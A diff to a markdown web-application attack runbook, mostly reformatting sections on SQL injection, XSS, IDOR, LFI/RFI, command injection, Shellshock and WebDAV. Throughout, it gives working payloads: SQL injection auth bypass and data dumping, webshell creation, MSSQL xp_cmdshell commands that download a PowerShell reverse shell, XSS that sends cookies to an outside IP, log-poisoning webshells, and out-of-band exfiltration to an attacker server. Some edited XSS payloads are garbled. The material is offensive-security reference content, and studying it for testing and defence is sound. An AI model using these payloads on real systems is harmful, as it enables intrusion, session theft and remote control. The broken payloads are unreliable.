@@ -1,24 +1,26 @@
 # Web Application Attacks
-<!--- Status 75% --->
+<!--- Status 90% --->
 <!--- Needs review --->
 
 ## Introduction
 
-This runbook provides a guide to attack web applications. It includes a variety of techniques and tools for gathering information, and exploiting the application.
+This runbook provides a guide to attack web applications. It includes a variety of techniques and tools for gathering information, and exploiting the application.  It will also help establish shells when needed, but also see the shell payload runbook to help create a shell.
 
 ## Table of Contents
 
 - [Web Application Attacks](#web-application-attacks)
   - [Introduction](#introduction)
   - [Table of Contents](#table-of-contents)
-  - [SQL Injection - MySQL/MariaDB](#sql-injection---mysqlmariadb)
+  - [SQL Injection](#sql-injection)
+    - [MySQL/MariaDB](#mysqlmariadb)
     - [Webshell via SQLI](#webshell-via-sqli)
     - [Reading Files via SQLI - MySQL](#reading-files-via-sqli---mysql)
-  - [Oracle SQL](#oracle-sql)
-  - [SQLite Injection](#sqlite-injection)
-  - [MSSQL Injection](#mssql-injection)
-  - [Abuse MSSQL](#abuse-mssql)
+    - [Oracle SQL](#oracle-sql)
+    - [SQLite Injection](#sqlite-injection)
+    - [MSSQL Injection](#mssql-injection)
+    - [Abuse MSSQL](#abuse-mssql)
   - [Cross-Site Scripting](#cross-site-scripting)
+    - [Steps for XXS](#steps-for-xxs)
     - [Wordlists for XSS Bypass](#wordlists-for-xss-bypass)
     - [XSS Auditor and XSS Filter](#xss-auditor-and-xss-filter)
     - [XSS Keylogger](#xss-keylogger)
@@ -42,37 +44,39 @@ This runbook provides a guide to attack web applications. It includes a variety 
     - [XSS to LFI](#xss-to-lfi)
     - [XSS - Session Hijacking](#xss---session-hijacking)
     - [Template - Nuclei](#template---nuclei)
-  - [Git Exposed](#git-exposed)
-    - [Tools](#tools)
-  - [Broken Access Control - IDOR (Insecure Direct Object References)](#broken-access-control---idor-insecure-direct-object-references)
-    - [IDOR + Parameter Pollution](#idor--parameter-pollution)
+  - [Broken Access Control](#broken-access-control)
+    - [IDOR (Insecure Direct Object References)](#idor-insecure-direct-object-references)
       - [HTTP Parameter Pollution](#http-parameter-pollution)
       - [Json Parameter Pollution](#json-parameter-pollution)
       - [Random Case](#random-case)
-    - [UUIDv1](#uuidv1)
+      - [UUIDv1](#uuidv1)
       - [Others](#others)
-  - [Git Exposed](#git-exposed-1)
-    - [Tools](#tools-1)
-  - [Local File Inclusion - LFI](#local-file-inclusion---lfi)
-    - [Replace ../ - Bypass](#replace----bypass)
-    - [Block . and / - Bypass](#block--and----bypass)
-    - [PHP Wrappers](#php-wrappers)
-    - [Filter PHP](#filter-php)
-    - [PHP Extension Bypass with Null Bytes](#php-extension-bypass-with-null-bytes)
+    - [Git Exposed](#git-exposed)
+      - [Git Tools](#git-tools)
+    - [Local File Inclusion - LFI](#local-file-inclusion---lfi)
+      - [Replace ../ - Bypass](#replace----bypass)
+      - [Block . and / - Bypass](#block--and----bypass)
+      - [PHP Wrappers](#php-wrappers)
+      - [Filter PHP](#filter-php)
+      - [PHP Extension Bypass with Null Bytes](#php-extension-bypass-with-null-bytes)
       - [LFI + File Upload](#lfi--file-upload)
       - [Log Poisoning](#log-poisoning)
-    - [Template LFI and directory traversal - Nuclei](#template-lfi-and-directory-traversal---nuclei)
-    - [Wordlists](#wordlists)
-  - [Remote File Inclusion (RFI)](#remote-file-inclusion-rfi)
-    - [RFI to Webshell with null byte for image extension bypass](#rfi-to-webshell-with-null-byte-for-image-extension-bypass)
-    - [RFI to Webshell with txt](#rfi-to-webshell-with-txt)
+    - [Directory traversal - Nuclei](#directory-traversal---nuclei)
+      - [Wordlists](#wordlists)
+    - [Remote File Inclusion (RFI)](#remote-file-inclusion-rfi)
+      - [RFI to Webshell with null byte for image extension bypass](#rfi-to-webshell-with-null-byte-for-image-extension-bypass)
+      - [RFI to Webshell with txt](#rfi-to-webshell-with-txt)
   - [OS Command Injection](#os-command-injection)
-  - [Shellshock](#shellshock)
-  - [WebDAV](#webdav)
+  - [Common Exploits](#common-exploits)
+    - [Shellshock](#shellshock)
+    - [WebDAV](#webdav)
 
-## SQL Injection - MySQL/MariaDB
+## SQL Injection
 
--> Bypass Authentication
+### MySQL/MariaDB
+
+- Bypass Authentication
+
 ```
 ' or 1=1 -- -
 admin' -- -
@@ -81,142 +85,169 @@ admin' -- -
 ' or 1=1 limit 1,1 -- -
 ```
 
--> get number columns
+- Get number columns
+
 ```
 -1 order by 3;#
 ```
 
--> get version
+- Get version
+
 ```
 -1 union select 1,2,version();#
 ```
 
--> get database name
+- Get database name
+
 ```
 -1 union select 1,2,database();#
 ```
 
--> get table name
+- Get table name
+
 ```
 -1 union select 1,2, group_concat(table_name) from information_schema.tables where table_schema="<database_name>";#
 ```
 
--> get column name
+- Get column name
+
 ``` 
 -1 union select 1,2, group_concat(column_name) from information_schema.columns where table_schema="<database_name>" and table_name="<table_name>";#
 ```
 
--> dump
+- Dump
+
 ```
 -1 union select 1,2, group_concat(<column_names>) from <database_name>.<table_name>;#
 ```
 
 ### Webshell via SQLI
 
--> view web server path  
-```
+- View web server path  
+
+```sql
 LOAD_FILE('/etc/httpd/conf/httpd.conf')    
 ```
 
--> creating webshell
-```
+- Creating webshell
+
+```sql
 select "<?php system($_GET['cmd']);?>" into outfile "/var/www/html/shell.php";
 ```
- 
+
 ### Reading Files via SQLI - MySQL
 
 e.g.  
-```
+```sql
 SELECT LOAD_FILE('/etc/passwd')
 ```
 
-## Oracle SQL
+### Oracle SQL
 
--> Bypass Authentication
+- Bypass Authentication
+
 ```
 ' or 1=1--
 ```
 
--> get number columns
+- Get number columns
+
 ```
 ' order by 3--
 ```
 
--> get table name
+- Get table name
+
 ```
 ' union select null,table_name,null from all_tables--
 ```
 
--> get column name
+- Get column name
+
 ```
 ' union select null,column_name,null from all_tab_columns where table_name='<table_name>'--
 ```
 
--> dump
+- Dump
 ```
 ' union select null,PASSWORD||USER_ID||USER_NAME,null from WEB_USERS--
 ```
 
-## SQLite Injection
+### SQLite Injection
 
--> extracting table names, not displaying standard sqlite tables
-```
+- Extracting table names, not displaying standard sqlite tables
+
+```sql
 http://site.com/index.php?id=-1 union select 1,2,3,group_concat(tbl_name),4 FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'--
 ```
--> extracting table users  
-```
+
+- Extracting table users
+
+```sql
 http://site.com/index.php?id=-1 union select 1,2,3,group_concat(password),5 FROM users--
 ```
 
--> Reference  
+- Reference  
 https://www.exploit-db.com/docs/english/41397-injecting-sqlite-database-based-applications.pdf
 
-## MSSQL Injection
+### MSSQL Injection
 
--> Bypass Authentication
+- Bypass Authentication
+
 ```
 ' or 1=1--
 ```
--> get version+delay
+
+- Get version+delay
+
 ```
 ' SELECT @@version; WAITFOR DELAY '00:00:10'; —
 ```
 
--> Enable xp_cmdshell
+- Enable xp_cmdshell
+
 ```
 ' UNION SELECT 1, null; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;--
 ```
 
--> RCE
+- RCE
+
 ```
 ' exec xp_cmdshell "powershell IEX (New-Object Net.WebClient).DownloadString('http://<ip>/InvokePowerShellTcp.ps1')" ;--
 ```
+
+- Refernce 
 https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1
 
-## Abuse MSSQL
+### Abuse MSSQL
 
--> edit Invoke-PowerShellTcp.ps1, adding this:  
-```
+- Edit Invoke-PowerShellTcp.ps1, adding this:  
+
+```powershell
+# Windows
 Invoke-PowerShellTcp -Reverse -IPAddress 192.168.254.226 -Port 4444
 ```
-```
+
+```sh
+# kali
 impacket-mssqlclient <user>@<ip> -db <database>
 ```
-```
+
+```cmd
+#windows
 xp_cmdshell powershell IEX(New-Object Net.webclient).downloadString(\"http://<ip>/Invoke-PowerShellTcp.ps1\")
 ```
 https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1
 
 ## Cross-Site Scripting
 
-1-> Identify the language and frameworks used  
-2-> Identify entry points (parameters, inputs, responses reflecting values you can control, etc)   
-3-> Check how this is reflected in the response via source code preview or browser developer tools  
-4-> Check the allowed special characters  
-```
-< > ' " { } ;
-```
-5-> Detect if there are filters or blockages and modify as needed to make it work
+### Steps for XXS
+
+1. Identify the language and frameworks used  
+2. Identify entry points (parameters, inputs, responses reflecting values you can control, etc)
+3. Check how this is reflected in the response via source code preview or browser developer tools  
+4. Check the allowed special characters  ' < > ' " { } ; "
+5. Detect if there are filters or blockages and modify as needed to make it work
 
 ### Wordlists for XSS Bypass
 
@@ -249,8 +280,10 @@ https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot
 
 ### Regex Blacklist Filtering
 
--> Filter blocking on - Bypass  
+- Filter blocking on - Bypass  
+
 `(on\w+\s*=)`  
+
 ```
 <svg onload%09=alert(1)> 
 <svg %09onload%20=alert(1)>
@@ -263,10 +296,8 @@ https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot
 #### Alert Blocked - Bypass
 
 ```
-<script>\u0061lert(1)</script>
-<script>\u0061\u006C\u0065\u0072\u0074(1)</script>
-<script>eval("\u0061lert(1)")</script>  
-<script>eval("\u0061\u006C\u0065\u0072\u0074\u0028\u0031\u0029")</script>
+<script>\alert(1)</script>
+<script>eval("Alert(1)")</script>  
 ```
 
 #### Removing script Tag - Bypass
@@ -279,8 +310,8 @@ https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot
 
 #### Methods
 
--> String.fromCharCode()  
--> unescape  
+- String.fromCharCode()  
+- unescape  
 
 e.g.  
 -> decode URI + unescape method (need eval)  
@@ -288,31 +319,37 @@ e.g.
 decodeURI(/alert(%22xss%22)/.source)
 decodeURIComponent(/alert(%22xss%22)/.source)
 ```  
- 
+
 ### Other bypass techniques
 
--> unicode  
+- unicode  
+
 ```
-<img src=x onerror="\u0061\u006c\u0065\u0072\u0074(1)"/>
+<img src=x onerror="\blank\blank(1)"/>
 ```
 
 Add execution sink:  
--> eval  
--> setInterval  
--> setTimeout  
+- eval
+- setInterval  
+- setTimeout  
+- octal
+```
 
--> octal  
+<img src=x onerror="eval('\alert(1)')"/>
 ```
-<img src=x onerror="eval('\141lert(1)')"/>
-```
--> hexadecimal  
+
+- hexadecimal  
+
 ```
 <img src=x onerror="setInterval('\x61lert(1)')"/>
 ```
--> mix  (uni, hex, octa)  
+
+- mix  (uni, hex, octa)  
+
 ```
 <img src=x onerror="setTimeout('\x61\154\145\x72\164\x28\x31\x29')"/>
 ```
+
 https://checkserp.com/encode/unicode/  
 http://www.unit-conversion.info/texttools/octal/  
 http://www.unit-conversion.info/texttools/hexadecimal/  
@@ -333,11 +370,7 @@ http://www.unit-conversion.info/texttools/hexadecimal/
 
 ```
 <input value="here"/></input>
-```
- 
-->  
-```
-" /><script>alert(1)</script>
+ /><script>alert(1)</script>
 ```
   
 #### Script Tag
@@ -348,7 +381,6 @@ http://www.unit-conversion.info/texttools/hexadecimal/
 </script>
 ```
   
-->  
 ```
 ";alert(1);//
 ```
@@ -359,7 +391,6 @@ http://www.unit-conversion.info/texttools/hexadecimal/
 <button onclick="here;">Okay!</button>
 ```
 
-->  
 ```
 alert(1)
 ```
@@ -370,7 +401,6 @@ alert(1)
 <script>var ok = location.search.replace("?ok=", "");domE1.innerHTML = "<a href=\'"+ok+"\'>ok</a>";</script>
 ```
   
-->  
 ```
 javascript:alert(1)
 ```
@@ -396,10 +426,11 @@ https://malwaredecoder.com/
 <img src=x onerror="document.write('<iframe src=file:///etc/passwd></iframe>')"/>
 <script>document.write('<iframe src=file:///etc/passwd></iframe>');</script>
 ```
-	
+
 ### XSS - Session Hijacking
 
--> Examples
+- Examples
+
 ```
 <script>new Image().src="http://<IP>/ok.jpg?output="+document.cookie;</script>
 <script type="text/javascript">document.location="http://<IP>/?cookie="+document.cookie;</script>  
@@ -412,18 +443,9 @@ https://malwaredecoder.com/
 
 https://raw.githubusercontent.com/esetal/nuclei-bb-templates/master/xss-fuzz.yaml
 
-## Git Exposed
+## Broken Access Control
 
-```
-git-dumper http://site.com/.git .
-```
-https://github.com/arthaud/git-dumper
-
-### Tools
-
-https://github.com/internetwache/GitTools
-
-## Broken Access Control - IDOR (Insecure Direct Object References)
+### IDOR (Insecure Direct Object References)
 
 1. Search listing of Id's in requests and in case you don't find create at least two accounts and analysis requests involving ID's  
 2. Identify access controls in the application  
@@ -432,7 +454,6 @@ https://github.com/internetwache/GitTools
 5. Try sending a (*) instead of the ID, especially at search points  
 6. Brute-force IDs depending on context and predictability
 
-### IDOR + Parameter Pollution
 
 #### HTTP Parameter Pollution
 
@@ -448,12 +469,16 @@ GET /api/v1/messages?id[]=<Your_User_ID>&id[]=<Another_User_ID>
 POST /api/v1/messages
 {"user_id":<You_user_id>,"user_id":<Anoher_User_id>} 
 ```
--> with a JSON Object
+
+- With a JSON Object
+
 ```
 POST /api/v1/messages
 {"user_id":{"user_id":<Anoher_User_id>}} 
 ```
--> with array  
+
+- With array  
+
 ```
 {"user_id":001} #Unauthorized
 {"user_id":[001]} #Authorized
@@ -464,44 +489,46 @@ POST /api/v1/messages
 GET /admin/profile #Unauthorized
 GET /ADMIN/profile #Authorized
 
-### UUIDv1
+#### UUIDv1
 
 https://caon.io/docs/exploitation/other/uuid/
 https://github.com/felipecaon/uuidv1gen
 
 #### Others
 
--> add .json if in ruby
+- Add .json if in ruby
 ```
 /user/1029 # Unauthorized
 /user/1029.json # Authorized
 ```
 
-## Git Exposed
+### Git Exposed
 
 ```
 git-dumper http://site.com/.git .
 ```
 https://github.com/arthaud/git-dumper
 
-### Tools
+#### Git Tools
 
 https://github.com/internetwache/GitTools
 
-## Local File Inclusion - LFI
+### Local File Inclusion - LFI
 
-### Replace ../ - Bypass
+#### Replace ../ - Bypass
 
 $language = str_replace('../', '', $_GET['file']);  
+
 ```
 /....//....//....//....//etc/passwd  
 ..././..././..././..././etc/paswd  
 ....\/....\/....\/....\/etc/passwd 
 ```
 
-### Block . and / - Bypass
+#### Block . and / - Bypass
 
--> urlencode and Double urlencode /etc/passwd  
+- urlencode and Double urlencode /etc/passwd  
+
 ```
 %2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64
 ```
@@ -509,7 +536,7 @@ $language = str_replace('../', '', $_GET['file']);
 %25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%36%35%25%37%34%25%36%33%25%32%66%25%37%30%25%36%31%25%37%33%25%37%33%25%37%37%25%36%34
 ```
 
-### PHP Wrappers
+#### PHP Wrappers
 
 ```
 data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id  
@@ -518,38 +545,43 @@ php://filter/read=convert.base64-encode/resource=index.php
 php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini
 ```
 
-### Filter PHP
+#### Filter PHP
 
--> Predefined Paths  
+- Predefined Paths  
 preg_match('/^\.\/okay\/.+$/', $_GET['file'])  
 
 ```
 ./okay/../../../../etc/passwd
 ```  
 
-### PHP Extension Bypass with Null Bytes
+#### PHP Extension Bypass with Null Bytes
 
 ```
 https://site.com/index.php?file=/etc/passwd%00.php
 ```  
--> Removing .php  
+
+- Removing .php  
+
 ```
 https://site.com/index.php?file=index.p.phphp
 ```  
   
 #### LFI + File Upload
 
--> gif  
+- gif
+
 ```
 echo 'GIF8<?php system($_GET["cmd"]); ?>' > ok.gif
-``` 
+```
+
 https://github.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/blob/main/codes/webshells/shell.gif  
--> Zip  
-1-  
+
+- Zip
+
 ```
 echo '<?php system($_GET["cmd"]); ?>' > ok.php && zip wshell_zip.jpg ok.php
 ```
-2-  
+
 ```
 http://ip/index.php?file=zip://./uploads/wshell_zip.jpg%23ok.php&cmd=id  
 https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/webshells/wshell_zip.jpg 
@@ -557,20 +589,22 @@ https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester
 
 #### Log Poisoning
 
--> apache
+- Apache
+
 ```
 nc ip 80  
 <?php system($_GET[‘cmd’]); ?>  
 ```  
+
 or  
-1-  
+ 
 ```
 curl -s http://ip/index.php -A '<?php system($_GET[‘cmd’]); ?>'
-```
-2-  
 http://ip/index.php?file=/var/log/apache2/access.log&cmd=id  
-  
--> SMTP  
+```
+
+- SMTP  
+
 ```
 telnet ip 23
 MAIL FROM: email@gmail.com
@@ -578,19 +612,22 @@ RCPT TO: <?php system($_GET[‘cmd’]); ?>
 http://ip/index.php?file=/var/mail/mail.log&cmd=id
 ```  
   
--> SSH  
+- SSH  
+
 ```
 ssh \'<?php system($_GET['cmd']);?>'@ip  
 http://ip/index.php?file=/var/log/auth.log&cmd=id
 ```  
 
--> PHP session  
+- PHP session  
+
 ```
 http://ip/index.php?file=<?php system($_GET["cmd"]);?>  
 http://ip/index.php?file=/var/lib/php/sessions/sess_<your_session>&cmd=id
 ```
   
--> Other Paths  
+- Other Paths  
+
 ```
 /var/log/nginx/access.log  
 /var/log/sshd.log  
@@ -598,31 +635,27 @@ http://ip/index.php?file=/var/lib/php/sessions/sess_<your_session>&cmd=id
 /proc/self/fd/0-50  
 ```
 
-### Template LFI and directory traversal - Nuclei
+### Directory traversal - Nuclei
 
 https://raw.githubusercontent.com/projectdiscovery/nuclei-templates/master/fuzzing/linux-lfi-fuzzing.yaml
 https://raw.githubusercontent.com/CharanRayudu/Custom-Nuclei-Templates/main/dir-traversal.yaml
 
-### Wordlists
+#### Wordlists
 
--> burp-parameter-names.txt - Wordlist for parameter fuzzing  
+- burp-parameter-names.txt - Wordlist for parameter fuzzing  
 https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/burp-parameter-names.txt  
-	
--> Wordlist LFI - Linux  
+- Wordlist LFI - Linux  
 https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt  
-	
--> Wordlist LFI - Windows  
+- Wordlist LFI - Windows  
 https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/LFI/LFI-gracefulsecurity-windows.txt 
-	
--> bypass_lfi.txt  
+- bypass_lfi.txt  
 https://github.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/blob/main/wordlists/lfi_bypass.txt  
-	
--> poisoning.txt  
+- poisoning.txt  
 https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/wordlists/posoning.txt  
 
-## Remote File Inclusion (RFI)
+### Remote File Inclusion (RFI)
 
-### RFI to Webshell with null byte for image extension bypass
+#### RFI to Webshell with null byte for image extension bypass
 
 ```
 echo "<?php echo shell_exec($_GET['cmd']); ?>" > evil.txt
@@ -632,7 +665,7 @@ python -m http.server 80
 http://site.com/menu.php?file=http://<IP>/evil.php%00.png
 ```
 
-### RFI to Webshell with txt
+#### RFI to Webshell with txt
 
 ```
 echo '<?php echo shell_exec($_GET["cmd"]); ?>' > evil.txt
@@ -644,7 +677,8 @@ http://site.com/menu.php?file=http://<IP>/evil.txt&cmd=ipconfig
 
 ## OS Command Injection
 
--> Special Characters
+- Special Characters
+
 ```
 & command
 && command
@@ -656,7 +690,8 @@ command %0A command
 $(command)
 ```
 
--> Out Of Band - OOB Exploitation
+- Out Of Band - OOB Exploitation
+
 ```
 curl http://$(whoami).site.com/
 curl http://`whoami`.site.com/
@@ -664,28 +699,34 @@ nslookup `whoami`.attacker-server.com &
 curl http://192.168.0.20/$(whoami)
 ```
 
--> Check if the commands are executed by PowerShell or CMD
+- Check if the commands are executed by PowerShell or CMD
+
 ```
 (dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
 ```
 
-## Shellshock
+## Common Exploits
 
--> Detection
+### Shellshock
+
+- Detection
+
 ```
 nikto -h <IP> -C all
 ```
-	
--> Exploit
+
+- Exploit
+
 ```
 curl -A "() { ignored; }; echo Content-Type: text/plain ; echo ; echo ; /bin/bash -c 'whoami'" <IP>
 curl -A "() { :; };echo ;/bin/bash -c 'hostname'"  <IP>
 curl -A "() { :; }; /usr/bin/nslookup $(whoami).site.com" <IP>
 ```
 
-## WebDAV
+### WebDAV
 
--> Connect to WebDAV server and send malicious file to shell
+- Connect to WebDAV server and send malicious file to shell
+
 ```
 cadaver http://<IP>/webdav
 put <shell.asp>
@@ -695,4 +736,4 @@ curl -u "<user>:<password>" http://<IP>/webdav/shell.asp
 ```
 https://github.com/notroj/cadaver
 
- <!--- Last Updated July 8, 2024 --->
+ <!--- Last Updated July 10, 2024 --->
